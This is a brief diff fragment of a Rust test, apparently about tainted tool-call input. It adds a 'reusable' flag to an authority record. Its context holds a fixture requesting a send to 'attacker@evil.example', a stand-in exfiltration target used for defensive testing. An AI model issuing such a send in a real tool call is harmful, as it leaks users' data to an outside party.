@@ -244,6 +244,7 @@ fn assert_tainted_call_input_is_exact() {
         "send": true, "to": "attacker@evil.example"});
     let text = |value: &str| value.to_owned();
     let record = AuthorityRecord {
+        reusable: true,
         request_id: text("id"),
         request_ref: text("ref"),
         identity_sha256: text("sha"),
